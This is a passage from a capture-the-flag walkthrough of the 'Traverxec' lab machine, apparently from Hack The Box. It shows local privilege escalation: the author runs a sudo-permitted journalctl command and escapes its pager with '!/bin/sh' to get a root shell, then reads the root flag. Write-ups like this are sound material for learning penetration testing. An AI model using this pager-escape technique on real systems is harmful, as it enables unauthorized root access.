If we go back to the user's home directory, we see a bin directory which we DID NOT look at. SMH!

```
david@traverxec:/tmp$ cd ~
david@traverxec:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  bin  .profile  public_www  .ssh  user.txt
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls -l
total 8
-r-------- 1 david david 802 Oct 25 16:26 server-stats.head
-rwx------ 1 david david 363 Oct 25 16:26 server-stats.sh
david@traverxec:~/bin$ cat server-stats.head 
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

The *server-stats.sh* script tell us it might be possible to run *journalctl* as *sudo*.

Seeing this makes me look at *sudo -l* but it requires a password, so we can only do this through the script or by using what is in the script.

Using *journalctl* to escalate privileges sounds like something we could look into in GTFOBins, which tell us we can escape the normal operation by typing *!/bin/sh* while in journalctl's *less* behavior. Let's try this!

```
david@traverxec:~/bin$ ./server-stats.sh 
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

Load:  23:11:01 up 13:32,  1 user,  load average: 0.00, 0.00, 0.00
 
Open nhttpd sockets: 0
Files in the docroot: 117
 
Last 5 journal log lines:
-- Logs begin at Thu 2020-04-09 09:38:12 EDT, end at Thu 2020-04-09 23:11:01 EDT. --
Apr 09 09:38:16 traverxec nhttpd[477]: max. file descriptors = 1040 (cur) / 1040 (max)
Apr 09 09:38:16 traverxec systemd[1]: Started nostromo nhttpd server.
Apr 09 13:23:27 traverxec sudo[843]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/0 ruser=www-data rhost=  user=www-data
Apr 09 13:56:03 traverxec su[873]: pam_unix(su-l:auth): authentication failure; logname= uid=33 euid=0 tty=pts/1 ruser=www-data rhost=  user=david
Apr 09 13:56:06 traverxec su[873]: FAILED SU (to david) www-data on pts/1

```

But, the obvious doesn't work which would be running the script. Let's try and run the journalctl command as shown in the script: ```/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service```

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Thu 2020-04-09 09:38:12 EDT, end at Thu 2020-04-09 23:13:58 EDT. --
Apr 09 09:38:16 traverxec nhttpd[477]: max. file descriptors = 1040 (cur) / 1040 (max)
Apr 09 09:38:16 traverxec systemd[1]: Started nostromo nhttpd server.
Apr 09 13:23:27 traverxec sudo[843]: pam_unix(sudo:auth): authentication failure; logname= uid=33
Apr 09 13:56:03 traverxec su[873]: pam_unix(su-l:auth): authentication failure; logname= uid=33 e
Apr 09 13:56:06 traverxec su[873]: FAILED SU (to david) www-data on pts/1
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/home/david/bin
```

**AND we are ROOT! Let's get that flag!**

```
# bash
root@traverxec:/home/david/bin# cat /root/root.txt 
9aa36**********************0d906
root@traverxec:/home/david/bin# 
```

AND we got the ROOT FLAG!

**NOTES:** A couple of thoughts here:
  1. Trying to look for vulnerabilities is never an unnecessary step, but in this case it lead me nowhere as for sure I did something wrong. Better not to fight it as this was the second time I did Traverxec but just to get this walkthrough done. Also, once I figured what I needed to do, it came back to me what I originally did.
  2. From people in the forum, I originally read the *journalctl* escape required you to have the terminal window in a certain size and that is not true. I got to escape its normal operation by simply typing *!/bin/sh* while it was still "running" and zero window resizing was needed.
  3. Enumerating the pages was not fruitful here as the connections were getting refused, but I still shared the process. Just like I mentioned with the vulnerabilities, this is also an important step when dealing with webpages.
